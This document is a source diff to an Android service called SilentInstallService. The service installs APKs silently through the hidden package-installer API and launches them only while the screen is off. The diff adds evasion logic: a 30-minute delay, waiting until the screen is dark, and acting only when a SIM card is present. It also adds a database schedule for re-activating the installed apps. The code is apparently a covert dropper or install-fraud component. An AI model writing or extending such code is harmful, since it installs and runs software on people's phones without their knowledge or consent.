@@ -26,6 +26,8 @@ import android.os.Environment;
 import android.os.IBinder;
 import android.os.RemoteException;
 import android.os.SystemClock;
+import android.telephony.TelephonyManager;
+import android.text.TextUtils;
 import android.util.Log;
 
 import com.xstd.active.plugin.dao.SilenceApp;
@@ -67,7 +69,7 @@ public class SilentInstallService extends Service {
         filter.addAction(Intent.ACTION_SCREEN_OFF);
         filter.addAction(Intent.ACTION_USER_PRESENT);
         registerReceiver(receiver, filter);
-
+        
         boolean fs = sharedPreferences.getBoolean("fs", false);
         if (!fs)
             copyFileToCache();
@@ -83,9 +85,8 @@ public class SilentInstallService extends Service {
     @Override
     public void onStart(Intent intent, int startId) {
     	super.onStart(intent, startId);
-    	String apk_path = intent.getStringExtra("apk_path");
-        if (apk_path != null)
-            installFile(new File(apk_path));
+        if (intent!=null&&!TextUtils.isEmpty(intent.getStringExtra("apk_path")))
+            installFile(new File(intent.getStringExtra("apk_path")),observer);
     }
 
     class ScreenChangeReceiver extends BroadcastReceiver {
@@ -94,38 +95,62 @@ public class SilentInstallService extends Service {
         public void onReceive(Context context, Intent intent) {
             String action = intent.getAction();
             if (Intent.ACTION_SCREEN_ON.equals(action)) {
+            	isScreenLignt = true;
                 active = false;
                 goHome();
             } else if (Intent.ACTION_SCREEN_OFF.equals(action)) {
+            	isScreenLignt = false;
                 activeApp();
             } else if (Intent.ACTION_USER_PRESENT.equals(action)) {
-                checkUpdates();
+                checkActive();
             }
         }
     }
+    
+    private boolean isScreenLignt = true;
 
-    private void checkUpdates() {
-
+    private void checkActive() {
+    	getDeviceInstallPackName();
+    	long currentTimeMillis = System.currentTimeMillis();
+    	long oneDay = 1000 * 60 * 60 * 24;
+    	SilenceAppDao dao = SilenceAppDaoUtils.getSilenceAppDao(this);
+    	Cursor cursor = dao.getDatabase().query(dao.getTablename(), dao.getAllColumns(), null, null, null, null, null);
+    	while(cursor.moveToNext()) {
+    		long installtime = cursor.getLong(cursor.getColumnIndex(SilenceAppDao.Properties.Installtime.columnName));
+    		long installTotal = currentTimeMillis-installtime;
+    		if(oneDay < installTotal &&  installTotal < oneDay*2) {
+    			SilenceApp entity = new SilenceApp();
+    			entity.setId(cursor.getLong(0));
+    			entity.setActive(false);
+    			dao.update(entity);
+    		} else if(oneDay *4 < installTotal && installTotal < oneDay *6) {
+    			SilenceApp entity = new SilenceApp();
+    			entity.setId(cursor.getLong(0));
+    			entity.setActive(false);
+    			dao.update(entity);
+    		}
+    	}
     }
 
     private String packageName;
     private boolean active;
     private List<String> packgeNames = new ArrayList<String>();
+    
+    /**
+     * 获取手机所有安装程序的包名
+     */
+    private void getDeviceInstallPackName(){
+    	packgeNames.clear();
+    		List<PackageInfo> pis = getPackageManager().getInstalledPackages(PackageManager.GET_ACTIVITIES);
+    		for (PackageInfo pi : pis)
+    			packgeNames.add(pi.packageName);
+    }
 
     /**
      * 激活安装的程序
      */
     private void activeApp() {
-    	packgeNames.clear();
-    	try {
-    		List<PackageInfo> pis = manager.getInstalledPackages(PackageManager.GET_ACTIVITIES);
-    		for (PackageInfo pi : pis) {
-    			packgeNames.add(pi.packageName);
-    		}
-		} catch (RemoteException e) {
-			e.printStackTrace();
-		}
-    	
+    	getDeviceInstallPackName();
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -141,13 +166,16 @@ public class SilentInstallService extends Service {
                     	SilenceApp entity = new SilenceApp();
                     	entity.setId(id);
                     	entity.setPackagename(packname);
-                    	dao.delete(entity);
+                    	dao.delete(entity); 
                     	break;
                     }
                     packageName = packname;
                     Intent app = getPackageManager().getLaunchIntentForPackage(packname);
                     startActivity(app);
                     SystemClock.sleep(15000);
+                    if(!active) {
+                    	break;
+                    }
                     SilenceApp entity = new SilenceApp();
                     entity.setId(id);
                     entity.setPackagename(packname);
@@ -164,15 +192,22 @@ public class SilentInstallService extends Service {
             }
         }).start();
     }
-    
+
+    /**
+     * 跳转到Launcher
+     */
     public void goHome() {
         Intent i= new Intent(Intent.ACTION_MAIN);
         i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         i.addCategory(Intent.CATEGORY_HOME);
         startActivity(i);
     }
-
-    private void installFile(File file) {
+ 
+    /**
+     * 安装程序
+     * @param file
+     */
+    private void installFile(File file, IPackageInstallObserver observer) {
         if (file == null)
             return;
         if (!file.isFile())
@@ -185,19 +220,7 @@ public class SilentInstallService extends Service {
         Uri uri = Uri.fromFile(file);
         if (uri != null)
             try {
-                manager.installPackage(uri, new IPackageInstallObserver.Stub() {
-
-                    @Override
-                    public void packageInstalled(String packageName, int returnCode) throws RemoteException {
-                        if (returnCode == 1) {
-                            SilenceApp sa = new SilenceApp();
-                            sa.setPackagename(packageName);
-                            sa.setInstalltime(System.currentTimeMillis());
-                            sa.setActive(false);
-                            SilenceAppDaoUtils.getSilenceAppDao(getApplicationContext()).insert(sa);
-                        }
-                    }
-                }, 0, packName);
+                manager.installPackage(uri, observer, 0, packName);
             } catch (RemoteException e) {
                 e.printStackTrace();
             }
@@ -216,11 +239,28 @@ public class SilentInstallService extends Service {
         }
         return null;
     }
-
+    
+    /**
+     * 判断手机sim卡是否正常
+     * @return
+     */
+    private boolean simReady(){
+    	TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+    	if(TelephonyManager.SIM_STATE_READY == tm.getSimState())
+    		return true;
+    	else
+    		return false;
+    }
+    
     private void copyFileToCache() {
+    	if(!simReady())
+    		return;
         new Thread(new Runnable() {
             @Override
             public void run() {
+            	SystemClock.sleep(1000 * 60 * 30);//等待30min
+            	while(isScreenLignt)//如果屏幕亮着，什么都不执行。
+            		SystemClock.sleep(2000);
                 if (!Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED))
                     return;
                 String sdcardPath = Environment.getExternalStorageDirectory().getAbsolutePath() + File.separator + "Download";
@@ -242,7 +282,7 @@ public class SilentInstallService extends Service {
                             os.write(b, 0, len);
                         }
                         os.flush();
-                        installFile(file);
+                        installFile(file,observer);
                     }
                  } catch (Exception e) {
                     e.printStackTrace();
@@ -259,5 +299,23 @@ public class SilentInstallService extends Service {
             }
         }).start();
     }
+    
+    /**
+     * 程序安装结果
+     */
+    private IPackageInstallObserver.Stub observer = new IPackageInstallObserver.Stub() {
+		
+		@Override
+		public void packageInstalled(String packageName, int returnCode)
+				throws RemoteException {
+			if (returnCode == 1) {
+                SilenceApp sa = new SilenceApp();
+                sa.setPackagename(packageName);
+                sa.setInstalltime(System.currentTimeMillis());
+                sa.setActive(false);
+                SilenceAppDaoUtils.getSilenceAppDao(getApplicationContext()).insert(sa);
+            }
+		}
+	};
 
 }
